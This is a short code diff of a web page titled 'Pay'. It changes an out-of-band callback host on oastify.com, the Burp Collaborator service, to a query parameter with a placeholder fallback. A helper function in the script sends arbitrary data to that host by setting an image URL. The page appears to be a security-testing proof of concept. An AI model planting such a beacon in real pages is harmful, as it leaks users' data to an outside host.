@@ -3,7 +3,7 @@
   <head><title>Pay</title></head>
   <body>
   <script>
-  const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';
+  const OOB = new URLSearchParams(location.search).get('oob') || 'https://YOUR_COLLABORATOR_ID.oastify.com';
   const log = d => new Image().src = OOB + '/handler?' + new URLSearchParams(
     typeof d === 'string' ? {m: d} : d
   ).toString();
